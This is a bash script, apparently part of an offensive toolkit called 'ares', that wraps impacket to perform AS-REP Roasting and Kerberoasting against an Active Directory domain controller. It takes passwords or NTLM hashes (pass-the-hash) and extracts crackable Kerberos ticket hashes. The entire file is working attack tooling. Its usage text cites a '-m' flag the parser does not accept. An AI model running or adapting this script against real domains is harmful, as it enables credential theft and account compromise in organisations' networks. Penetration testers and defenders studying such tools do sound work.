#!/bin/bash

line="\n============================================================\n"
domain=""
username=""
password=""
mode=""
dc=""
ntlm=""

Help()
{
  cat <<EOF
[Options]
	-h: Display this help message
	-i <IP_ADDRESS>: The Domain Controller's IP Address
	-x <MODE>: Select the operation to perform
	-d <DOMAIN.TLD>: The full domain name (e.g., xample.local)

	-u <USERNAME>: The user to authenticate as
	-U <USER_LIST>: File path for a list of usernames

	-p <PASSWORD>: The password to use for authentication
        -n <NTLM>: Authenticate using the specified NTLM hash, instead of a password


[Modes]
	asrep: Perform ASREP Roasting
	krb: Perform Kerberoasting

[Usage]
	ares -m roast -x asrep -i 123.45.67.890 -d xample.local -U /tmp/users.txt
	ares -m roast -x krb -i 123.45.67.890 -d xample.local -u bob -n 8846F7EAEE8FB117AD06BDD830B7586C

EOF
  exit 0
}

while getopts ":hi:x:d:u:U:p:n:" option; do
  case "$option" in
    h)
      Help
      ;;
    i)
      dc=$OPTARG
      ;;
    x)
      mode=$OPTARG
      ;;
    d)
      domain=$OPTARG
      ;;
    u)
      username=$OPTARG
      ;;
    p)
      password=$OPTARG
      ;;
    U)
      user_list=$OPTARG
      ;;
    n)
      case "$OPTARG" in
        *:*:*)
	  echo -e "\n[-] Invalid NTLM hash format"
	  exit 1
	  ;;
        *:*)
	  ntlm="$OPTARG"
	  ;;
        *)
	  ntlm=":$OPTARG"
	  ;;
      esac
      ;;
    \?)
      echo -e "\nError: Invalid argument"
  esac
done

if [[ -z "$mode" ]]; then
  cat <<EOF
$line
Select an operation to perform

[Modes]
	asrep: Perform ASREP Roasting
	krb: Perform Kerberoasting

EOF
  read mode
fi

if [[ -z "$domain" ]]; then
  echo -e "\nEnter the full domain name (e.g., xample.local)"
  read domain
fi	

if [[ -z "$dc" ]]; then
  echo -e "\nEnter the Domain Controller's IP Address"
  read dc
fi

case "$mode" in
  asrep)
    if [[ -n "$user_list" ]]; then
      echo -e "\n[!] Tip: You may miss accounts if you perform ASREP Roasting without authenticating. After you obtain credentials, try using them to ASREP Roast again\n\n"
      impacket-GetNPUsers -usersfile "$user_list" -request -format john -dc-ip "$dc" -no-pass "${domain}/"

    elif [[ -z "$username" ]]; then
      echo -e "\nEnter the domain account's username"
      read username
    fi

    if [[ -z "$user_list" ]]; then
      if [[ -z "$ntlm" ]]; then

        if [[ -z "$password" ]]; then
          echo -e "\nEnter the password to authenticate with"
          read password
        fi

        impacket-GetNPUsers -request -format john -dc-ip "$dc" "${domain}/${username}:${password}"

      elif [[ -n "$ntlm" ]]; then
        impacket-GetNPUsers -request -format john -dc-ip "$dc" -hashes "$ntlm" "${domain}/${username}"
      fi
    fi
    ;;

  krb)
    if [[ -z "$username" ]]; then
      echo -e "\nEnter the domain account's username"
      read username
    fi

    if [[ -z "$ntlm" ]]; then
      if [[ -z "$password" ]]; then
        echo -e "\nEnter the password to authenticate with"
        read password
      fi

      impacket-GetUserSPNs -request -dc-ip "$dc" "${domain}/${username}:${password}"

    elif [[ -n "$ntlm" ]]; then
      impacket-GetUserSPNs -request -dc-ip "$dc" -hashes "$ntlm" "${domain}/${username}:${password}"
    fi
    ;;
  \?)
    echo -e "\nError: Invalid mode selected"
esac
